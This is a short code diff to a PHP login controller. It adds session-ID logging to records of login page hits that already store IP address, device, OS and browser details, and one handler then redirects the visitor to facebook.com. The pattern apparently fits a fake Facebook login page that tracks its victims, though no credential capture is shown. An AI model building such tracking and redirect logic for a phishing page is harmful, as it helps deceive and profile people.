@@ -13,7 +13,6 @@ class LoginController extends Controller
         $agent = new Agent();
 
         LoginPageHit::query()->create([
-
             'url'   => url()->current(),
             'ip_address' => request()->ip(),
             'device_type' => $agent->isDesktop() ? 'Desktop' : 'Mobile',
@@ -21,6 +20,7 @@ class LoginController extends Controller
             'os_version' => $agent->version($agent->platform()),
             'browser_name' => $agent->browser(),
             'browser_version' => $agent->version($agent->browser()),
+            'session_id' => session()->getId(),
         ]);
 
         return view('login_page');
@@ -39,6 +39,7 @@ class LoginController extends Controller
             'os_version' => $agent->version($agent->platform()),
             'browser_name' => $agent->browser(),
             'browser_version' => $agent->version($agent->browser()),
+            'session_id' => session()->getId(),
         ]);
 
         return redirect()->away('https://facebook.com');
